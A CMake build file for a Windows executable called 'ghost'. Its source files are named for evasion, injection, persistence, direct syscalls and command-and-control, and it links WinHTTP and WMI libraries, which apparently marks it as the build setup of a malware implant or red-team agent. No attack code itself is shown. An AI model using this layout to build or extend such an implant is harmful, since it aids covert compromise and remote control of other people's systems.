cmake_minimum_required(VERSION 3.20)
project(ghost LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded")
set(CMAKE_CXX_FLAGS "/O2 /W4 /DUNICODE /D_UNICODE /D_CRT_SECURE_NO_WARNINGS")

add_executable(ghost WIN32
    src/main.cpp
    src/syscalls.cpp
    src/evasion.cpp
    src/injection.cpp
    src/persistence.cpp
    src/c2.cpp
    src/utils.cpp
    resources/ghost.rc
)

target_link_libraries(ghost
    winhttp
    wbemuuid
    ole32
    oleaut32
    ntdll
    advapi32
    shell32
    user32
)

target_include_directories(ghost PRIVATE include)